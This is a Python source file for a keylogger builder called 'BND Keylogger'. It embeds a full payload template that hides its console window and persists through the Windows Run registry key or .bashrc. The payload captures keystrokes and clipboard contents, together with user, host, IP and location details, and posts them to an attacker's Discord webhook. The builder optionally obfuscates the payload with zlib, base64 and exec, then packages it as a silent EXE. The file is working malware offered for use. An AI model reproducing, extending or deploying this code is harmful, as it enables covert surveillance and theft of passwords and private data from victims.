import sys
if hasattr(sys.stdout, 'reconfigure'): sys.stdout.reconfigure(encoding='utf-8')
import os, time, math, datetime, random, string, base64, zlib, subprocess, getpass, shutil

_VOID = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _VOID not in sys.path:
    sys.path.insert(0, _VOID)
from lib import constants as C

from rich.console import Console, Group
from rich.panel   import Panel
from rich.text    import Text
from rich.align   import Align
from rich         import box
from rich.rule    import Rule
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console(highlight=False)
C_BLUE = "#0066FF"; C_DARK_BLUE = "#0033CC"; C_LIGHT_BLUE = "#66B3FF"; C_WHITE = "#FFFFFF"; C_SILVER = "#CCCCCC"; C_DIM = "#444444"; C_GOLD = "#FFD700"; C_GREEN = "#00FF88"

ASCII = r"""
   ██████╗ ███╗   ██╗██████╗     ████████╗ ██████╗  ██████╗ ██╗     ███████╗
   ██╔══██╗████╗  ██║██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
   ██████╔╝██╔██╗ ██║██║  ██║       ██║   ██║   ██║██║   ██║██║     ███████╗
   ██╔══██╗██║╚██╗██║██║  ██║       ██║   ██║   ██║██║   ██║██║     ╚════██║
   ██████╔╝██║ ╚████║██████╔╝       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
   ╚═════╝ ╚═╝  ╚═══╝╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
"""
SUBTITLE = " B N D   K E Y L O G G E R   -   E X E   B U I L D E R "

# ─── PAYLOAD TEMPLATE (V3.1 - FIXED IMPORTS) ───
PAYLOAD_RAW = r'''import sys, os, time, threading, json, platform, socket, datetime, subprocess, base64, re, uuid, random, string, getpass

# ============== AUTO INSTALL DEPENDENCIES ==============
def _req(m):
    try:
        __import__(m)
    except ImportError:
        try:
            c = [sys.executable, '-m', 'pip', 'install', m, '--quiet']
            if os.name == 'nt': 
                subprocess.check_call(c, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=0x08000000)
            else: 
                subprocess.check_call(c, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except ImportError:
            pass

# Install all required modules
_req('requests')
_req('pynput')
_req('colorama')
_req('pyperclip')

import requests
from pynput.keyboard import Key, Listener
import pyperclip

try:
    from colorama import Fore, Style, init
    init()
except ImportError:
    class Fore: RED=GREEN=YELLOW=WHITE=CYAN=MAGENTA=RESET=''
    class Style: BRIGHT=''

WURL = "__WEBHOOK__"
SID  = "__SESSION__"
DISC = "__DISCORD__"

# ============== AUTOSTART ==============
def add_to_startup():
    try:
        if os.name == 'nt':
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            try:
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "BNDKeylogger", 0, winreg.REG_SZ, sys.executable + ' "' + os.path.abspath(__file__) + '"')
            except ImportError:
                pass
        else:
            home = os.path.expanduser("~")
            rc_file = os.path.join(home, ".bashrc")
            if os.path.exists(rc_file):
                with open(rc_file, 'a') as f:
                    f.write(f'\npython3 "{os.path.abspath(__file__)}" &\n')
    except ImportError:
        pass

# ============== HIDE CONSOLE ==============
def hide_console():
    if os.name == 'nt':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except ImportError:
            pass

def _sys():
    try:
        h = socket.gethostname()
        u = os.getlogin() if os.name == 'nt' else os.environ.get('USER', '?')
        s = '{} {} {}'.format(platform.system(), platform.release(), platform.machine())
        iip = socket.gethostbyname(h)
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        try:
            d = requests.get('https://ipapi.co/json/', timeout=8).json()
            i = d.get('ip', '?')
            c = d.get('country_name', '?')
            cy = d.get('city', '?')
            o = d.get('org', '?')
        except (requests.RequestException, ValueError):
            try:
                i = requests.get('https://api.ipify.org', timeout=5).text.strip()
            except (requests.RequestException, ValueError):
                i = '?'
            c = cy = o = '?'
        return h, u, s, i, c, cy, o, iip, mac
    except (requests.RequestException, ValueError):
        return '', '', '', '', '', '', '', '', ''

def _post(eb):
    try:
        requests.post(WURL, json={'embeds': [eb]}, timeout=20)
    except (requests.RequestException, ValueError):
        pass

_l = []
_lock = threading.Lock()
_c = 0
_t = time.time()

def _conn():
    h, u, s, i, c, cy, o, iip, mac = _sys()
    emb = {
        'title': '👑  BND - TARGET ONLINE',
        'color': 0x0066FF,
        'description': f'```ansi\n\u001b[1;34m[+] DEVICE INFECTED\u001b[0m\n\u001b[1;34m[!] Discord: {DISC}\u001b[0m\n```',
        'fields': [
            {'name': '👤 User', 'value': f'`{u}`', 'inline': True},
            {'name': '💻 Machine', 'value': f'`{h}`', 'inline': True},
            {'name': '🌐 Public IP', 'value': f'`{i}`', 'inline': True},
            {'name': '📍 Location', 'value': f'`{cy}, {c}`', 'inline': True},
            {'name': '📡 ISP', 'value': f'`{o}`', 'inline': False},
            {'name': '⚙️ System', 'value': f'`{s}`', 'inline': False},
        ],
        'footer': {'text': f'BND Keylogger | {SID}'},
        'timestamp': datetime.datetime.now(datetime.timezone.utc).isoformat()
    }
    _post(emb)

def _flush(trigger):
    with _lock:
        if not _l:
            return
        snap = "".join(_l)
        cnt = _c
        _l.clear()
    el = time.time() - _t
    dur = "{:02d}m {:02d}s".format(int(el // 60), int(el % 60))
    
    # Auch Clipboard loggen
    try:
        clip = pyperclip.paste()
        if clip and len(clip) > 0:
            snap += f"\n[CLIPBOARD] {clip[:200]}"
    except (ValueError, EOFError):
        pass
    
    emb = {
        'title': f'📈  LOG CAPTURE ── {trigger}',
        'color': 0x0066FF,
        'fields': [
            {'name': '⌨️ Keys', 'value': f'`{cnt}`', 'inline': True},
            {'name': '⏱ Time', 'value': f'`{dur}`', 'inline': True},
            {'name': '📋 Captured Data', 'value': f'```\n{snap[-950:] if len(snap)>950 else snap}\n```', 'inline': False},
        ],
        'footer': {'text': f'BND Keylogger | Session: {SID}'},
        'timestamp': datetime.datetime.now(datetime.timezone.utc).isoformat()
    }
    _post(emb)

def _on(k):
    global _c
    try:
        try:
            c = k.char
        except AttributeError:
            c = str(k)
        is_ent = (k == Key.enter)
        if k == Key.space:
            c = ' '
        elif k == Key.enter:
            c = '\n'
        elif k == Key.backspace:
            c = '[<]'
        elif k == Key.tab:
            c = '\t'
        elif 'Key.' in c:
            c = ''
        if c:
            with _lock:
                _l.append(c)
                _c += 1
            if is_ent:
                threading.Thread(target=_flush, args=('INSTANT_ENTER',), daemon=True).start()
            elif len(_l) >= 50:
                threading.Thread(target=_flush, args=('BATCH_50',), daemon=True).start()
    except Exception:
        pass

# ============== MAIN ==============
def main():
    hide_console()
    add_to_startup()
    
    # Connection
    threading.Thread(target=_conn, daemon=True).start()
    
    # Heartbeat every 2 minutes
    threading.Thread(target=lambda: (time.sleep(120), _flush('HEARTBEAT')), daemon=True).start()
    
    # Clipboard logger every 30 seconds
    def clip_logger():
        last_clip = ""
        while True:
            try:
                current = pyperclip.paste()
                if current and current != last_clip and len(current) > 10:
                    last_clip = current
                    with _lock:
                        _l.append(f"\n[CLIP] {current[:200]}")
                        _c += 1
                time.sleep(30)
            except Exception:
                time.sleep(30)
    threading.Thread(target=clip_logger, daemon=True).start()
    
    # Keylogger Listener
    threading.Thread(target=lambda: (Listener(on_press=_on).start()), daemon=True).start()
    
    # Keep alive - run silently in background
    while True:
        time.sleep(3600)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
'''

def obfuscate_code(code):
    compressed = zlib.compress(code.encode('utf-8'))
    encoded = base64.b64encode(compressed).decode('utf-8')
    return f"import base64,zlib;exec(zlib.decompress(base64.b64decode('{encoded}')))"

def build_exe(script_path, output_name):
    """Build EXE using PyInstaller"""
    try:
        # Check if PyInstaller is installed
        try:
            import PyInstaller
        except ImportError:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyinstaller', '--quiet'])
        
        # Build EXE with hidden imports
        cmd = [
            sys.executable, '-m', 'PyInstaller',
            '--onefile',
            '--noconsole',
            '--name', output_name,
            '--distpath', os.path.dirname(script_path),
            '--workpath', os.path.join(os.path.dirname(script_path), 'build'),
            '--specpath', os.path.dirname(script_path),
            '--hidden-import', 'platform',
            '--hidden-import', 'socket',
            '--hidden-import', 'uuid',
            '--hidden-import', 'pynput',
            '--hidden-import', 'requests',
            '--hidden-import', 'colorama',
            '--hidden-import', 'pyperclip',
            '--clean',
            script_path
        ]
        
        subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Move EXE to output folder
        exe_path = os.path.join(os.path.dirname(script_path), output_name + '.exe')
        if os.path.exists(exe_path):
            return exe_path
        return None
    except Exception as e:
        return None

def boot():
    if sys.platform.startswith("win"): os.system("title BND KEYLOGGER BUILDER")
    os.system("cls" if os.name == "nt" else "clear")
    sys.stdout.write("\033[?25l")
    lines = ASCII.strip("\n").split("\n")
    t0 = time.time()
    try:
        while time.time() - t0 < 1.6:
            t = time.time() - t0
            sys.stdout.write("\033[H\n")
            for line in lines:
                sys.stdout.write("  ")
                for c, ch in enumerate(line):
                    if ch == " ": sys.stdout.write(" ")
                    else:
                        v = max(40, min(255, int(80 + 175 * math.sin(t * 9 - c * 0.18))))
                        # Blaues Design
                        r = int(v * 0.1)
                        g = int(v * 0.3)
                        b = v
                        sys.stdout.write(f"\033[38;2;{r};{g};{b}m{ch}")
                sys.stdout.write("\033[0m\n")
            sys.stdout.write(f"\n  \033[38;2;0;100;255m{SUBTITLE}\033[0m\n")
            sys.stdout.flush()
            time.sleep(0.025)
    finally:
        sys.stdout.write("\033[?25h\033[0m")
    os.system("cls" if os.name == "nt" else "clear")

def section(title):
    console.print()
    console.print(Rule(f"[bold {C_BLUE}]  {title}  [/]", style=C_BLUE))
    console.print()

def get_output_dir():
    script_dir  = os.path.dirname(os.path.abspath(__file__))
    bnd_parent = os.path.abspath(os.path.join(script_dir, "..", "..", ".."))
    out_dir     = os.path.join(bnd_parent, "BND - Output", "Keylogger")
    if not os.path.exists(out_dir): os.makedirs(out_dir, exist_ok=True)
    return out_dir

def main():
    boot()
    console.print(Align.center(Panel(
        Group(
            Align.center(Text.from_markup(f"[bold {C_BLUE}]BND KEYLOGGER BUILDER[/] [white]v3.1 EXE[/]")),
            Text(""),
            Align.center(Text.from_markup(f"[bold {C_WHITE}]MODE :[/] [bold {C_LIGHT_BLUE}]SILENT BACKGROUND + AUTOSTART + EXE[/]")),
            Align.center(Text.from_markup(f"[dim {C_DIM}]Creates a standalone .EXE keylogger[/]"))
        ),
        border_style=C_BLUE, padding=(1, 4), box=box.DOUBLE_EDGE
    )))

    # STEP 1
    section("STEP 1  ──  CONFIG WEBHOOK")
    webhook_url = console.input(f"  [bold {C_BLUE}]└─▶[/] Webhook >> ").strip()
    if not webhook_url.startswith("http"): 
        console.print(" [bold red]Invalid webhook![/]")
        console.input(f"\n [dim]Press [bold {C_BLUE}]ENTER[/] to exit...[/]")
        return

    # STEP 2
    section("STEP 2  ──  STEALTH")
    is_ultra = (console.input(f"\n  [bold {C_BLUE}]02 »[/] Obfuscate code? (y/n) >> ").strip().lower() == "y")

    # STEP 3
    section("STEP 3  ──  FILENAME")
    fname_input = console.input(f"  [bold {C_BLUE}]└─▶[/] Name (Keylogger) >> ").strip() or "Keylogger"

    # BUILD
    section("BUILDING PAYLOAD & EXE")
    out_dir = get_output_dir()
    
    # Create temp .py file
    temp_py = os.path.join(out_dir, f"{fname_input}_temp.py")
    exe_path = os.path.join(out_dir, f"{fname_input}.exe")

    with Progress(
        SpinnerColumn(spinner_name="dots2", style=f"bold {C_BLUE}"), 
        TextColumn("[white]Building BND Keylogger..."), 
        BarColumn(bar_width=30),
        console=console
    ) as p:
        task = p.add_task("", total=3)
        
        # Step 1: Create Python file
        code = (
            PAYLOAD_RAW.replace("__WEBHOOK__", webhook_url)
            .replace("__SESSION__", fname_input)
            .replace("__DISCORD__", getattr(C, "TELEGRAM", C.DISCORD))
        )
        
        if is_ultra:
            code = obfuscate_code(code)
        
        with open(temp_py, "w", encoding="utf-8") as f:
            f.write("# -*- coding: utf-8 -*-\n" + code)
        p.update(task, advance=1)
        time.sleep(0.5)
        
        # Step 2: Build EXE
        p.update(task, description="[bold gold]Building EXE (takes ~30 sec)...")
        result = build_exe(temp_py, fname_input)
        p.update(task, advance=1)
        time.sleep(0.5)
        
        # Step 3: Cleanup
        p.update(task, description="[bold green]Cleaning up...")
        # Remove temp files
        try:
            os.remove(temp_py)
        except OSError:
            pass
        try:
            shutil.rmtree(os.path.join(out_dir, 'build'), ignore_errors=True)
        except OSError:
            pass
        try:
            os.remove(os.path.join(out_dir, f"{fname_input}.spec"))
        except OSError:
            pass
        p.update(task, advance=1)

    if os.path.exists(exe_path):
        console.print(Panel(
            Group(
                Align.center(Text.from_markup(f"[bold {C_GREEN}]✔ BND KEYLOGGER EXE BUILT[/]")),
                Text(""),
                Text.from_markup(f"  [dim]File :[/] [bold {C_LIGHT_BLUE}]{fname_input}.exe"),
                Text.from_markup(f"  [dim]Mode :[/] [bold {C_LIGHT_BLUE}]Silent Background"),
                Text.from_markup(f"  [dim]Autostart :[/] [bold {C_LIGHT_BLUE}]Enabled (Windows Registry)"),
                Text.from_markup(f"  [dim]Obfuscated :[/] [bold {C_LIGHT_BLUE}]{'Yes' if is_ultra else 'No'}"),
                Text(""),
                Align.center(Text.from_markup(f"[dim]Size: {os.path.getsize(exe_path) // 1024} KB[/]"))
            ),
            border_style=C_GREEN, box=box.DOUBLE_EDGE, padding=(1, 4)
        ))
    else:
        console.print(" [bold red]EXE build failed! Falling back to .py[/]")
        # Copy .py as fallback
        fallback_path = os.path.join(out_dir, f"{fname_input}.py")
        with open(temp_py, 'r') as src:
            with open(fallback_path, 'w') as dst:
                dst.write(src.read())
        console.print(f" [bold yellow]Saved as: {fallback_path}[/]")
    
    if console.input(f"\n  [bold {C_BLUE}]>[/] [dim]Open folder ? (y/n) >> [/]").lower() == 'y':
        try:
            os.startfile(out_dir) if os.name == 'nt' else os.system(f'xdg-open "{out_dir}"')
        except Exception:
            try:
                import webbrowser
                webbrowser.open(out_dir)
            except Exception:
                pass
    
    console.input(f"\n [dim]Press [bold {C_BLUE}]ENTER[/] to exit...[/]")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: pass